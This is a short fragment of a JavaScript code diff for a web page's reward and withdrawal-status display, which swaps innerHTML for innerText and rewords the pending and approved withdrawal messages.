+        document.getElementById('movie-reward').innerText = `$${(picInfo.reward !== undefined ? picInfo.reward : 0.50).toFixed(2)}`;
       }
 
-      const wStatus = document.getElementById('withdraw-status');
-      if (user.withdrawalStatus === 'Pending') {
-        wStatus.innerHTML = `<span style="color:var(--warning); font-weight:700;">Withdrawal of $${(user.withdrawalAmount || 0).toFixed(2)} is Pending Approval</span>`;
-      } else if (user.withdrawalStatus === 'Approved') {
-        wStatus.innerHTML = `<span style="color:var(--success); font-weight:700;">Recent Withdrawal Request Approved!</span>`;
+      const withdrawStatusElem = document.getElementById('withdraw-status');
+      if (u.withdrawalStatus === 'Pending') {
+        withdrawStatusElem.innerText = `Pending withdrawal request for $${u.withdrawalAmount.toFixed(2)}`;
+        withdrawStatusElem.style.color = 'var(--warning)';
+      } else if (u.withdrawalStatus === 'Approved') {
+        withdrawStatusElem.innerText = `Last withdrawal of $${u.withdrawalAmount.toFixed(2)} was approved.`;
+        withdrawStatusElem.style.color = 'var(--success)';
       } else {
-        wStatus.innerText = '';
+        withdrawStatusElem.innerText = '';
       }
     }
 
